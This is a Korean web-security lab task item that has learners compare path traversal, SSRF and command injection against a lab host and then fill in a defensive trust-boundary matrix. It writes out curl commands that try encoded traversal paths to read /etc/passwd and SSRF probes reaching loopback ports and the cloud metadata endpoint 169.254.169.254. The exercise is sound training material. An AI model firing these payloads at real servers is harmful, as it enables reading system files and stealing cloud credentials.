- order: 99
  instruction: |
    [복합 시나리오] "서버 측 신뢰 경계 침범 — Path Traversal + SSRF + Command Injection 비교"

    ## 상황 (w06 → w07 시나리오 연속)

    > 선배: "Path Traversal, SSRF, Command Injection — 표면은 다른데, 모두 *서버 신뢰 경계*를 깨는 거야.
    > Path 는 파일시스템, SSRF 는 네트워크, Command 는 OS 셸 경계. 셋 다 사용자 입력이 그대로 서버 자원에 박힘.
    > 클라우드 환경에선 SSRF 로 169.254.169.254 메타데이터 접근이 *Critical*. 비교 점검 + 매트릭스."

    학습 목표 (lecture #2 Path Traversal + #3 Command Injection) + (lab #1·#3·#4·#10 SSRF) 통합.

    ## 임무 (3 단계, 약 35분)

    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.

    ### Phase A — Path Traversal 3 우회
    `for p in '../etc/passwd' '....//etc/passwd' '%2e%2e%2fetc%2fpasswd'; do
       echo "=== $p ==="; curl -s "http://10.20.30.80/ftp/$p" | head -c 200; echo; done`
    실 차단되어도 시도와 응답이 학습.

    ### Phase B — SSRF + 메타데이터 3 케이스
    `curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80/redirect?to=http://127.0.0.1:22"`
    `curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80/redirect?to=http://169.254.169.254/latest/meta-data/"`
    `curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80/redirect?to=http://[::1]:8080/"`
    각 status code 캡처.

    ### Phase C — 신뢰 경계 매트릭스
    | 취약점 | 침범 경계 | 입력 위치 | 핵심 방어 | 잔존 위험 |
    | Path Traversal | 파일시스템 | 파일명 | basename + chroot | symlink |
    | SSRF | 네트워크 | URL | URL allowlist + DNS pin | DNS rebinding |
    | Command Injection | OS shell | shell metachar | exec(args[]) + arg quoting | env injection |
    | XXE | 파일+네트워크 | XML entity | disable external entity | zip slip |
    표 끝 "공통 원칙: 서버 측 신뢰 경계는 *명시적 allowlist* + *sandbox*. blocklist 우회됨" 한 줄.

    종료: echo "=== Phase A Path ===" / "=== Phase B SSRF ===" / "=== Phase C 매트릭스 ===".
